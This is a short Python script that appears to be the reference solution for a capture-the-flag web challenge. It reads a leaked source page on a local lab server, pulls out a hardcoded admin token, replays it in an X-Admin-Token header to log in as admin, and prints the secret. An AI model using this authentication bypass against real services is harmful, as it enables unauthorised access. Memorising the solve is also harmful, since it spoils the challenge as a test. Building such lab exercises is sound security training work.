#!/usr/bin/env python3
# baseline solve for web_local_source_leak
# 1. Fetch /source to find the token requirement
# 2. Call /api/login?user=admin with X-Admin-Token header
# 3. Parse the JSON response for the flag
import sys, os, urllib.request, json, re

# Get target URL from env (set by orchestrator) or default
port = os.environ.get('PORT', '5001')
base = f'http://127.0.0.1:{port}'

# Step 1: fetch source
src = urllib.request.urlopen(f'{base}/source').read().decode('utf-8', errors='ignore')

# Step 2: extract token from source
m = re.search(r'zhulongx-admin-bypass', src)
if m:
    token = m.group(0)
else:
    print('could not find token in source')
    sys.exit(1)

# Step 3: call login with token
req = urllib.request.Request(
    f'{base}/api/login?user=admin',
    headers={'X-Admin-Token': token}
)
resp = urllib.request.urlopen(req).read().decode('utf-8', errors='ignore')
data = json.loads(resp)
print(data.get('secret', 'no secret'))
